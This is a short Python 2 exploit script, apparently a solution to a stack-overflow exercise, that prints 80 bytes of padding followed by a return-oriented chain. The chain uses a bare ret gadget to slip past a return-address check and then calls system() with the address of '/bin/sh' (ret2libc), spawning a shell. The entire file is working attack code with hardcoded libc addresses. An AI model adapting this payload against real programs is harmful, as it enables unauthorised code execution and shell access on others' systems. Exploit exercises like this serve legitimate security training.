#!/usr/bin/env python2

# Same code as for ret2libc 
# with an added gadget at the beggining just to get throught the validation

import struct
import sys

bufferSize = 80
emptyGadgetAddrs = 0x08048617
systemAddrs = 0xb7ecffb0
exitAddrs = 0xb7ec60c0
binSHStringAddrs = 0xb7fb63bf

bufferOverflow = "A" * bufferSize
ropChain = [
    struct.pack("I", emptyGadgetAddrs),
    struct.pack("I", systemAddrs),
    struct.pack("I", exitAddrs),
    struct.pack("I", binSHStringAddrs)
]

# ----- STACK -----
# AAAAAAAAAAAAAAAAA
# AAAAAAAAAAAAAAAAA
# AAAAAAAAAAAAAAAAA
# AAAAAAAAAAAAAAAAA
# AAAAAAAAAAAAAAAAA
# -----------------
# empty gadget (ret) <== bypass the address validation
# systemAddrs
# exitAddrs
# binSHStringAddrs
# -----------------

sys.stdout.write(bufferOverflow)
for gadget in ropChain:
    sys.stdout.write(gadget)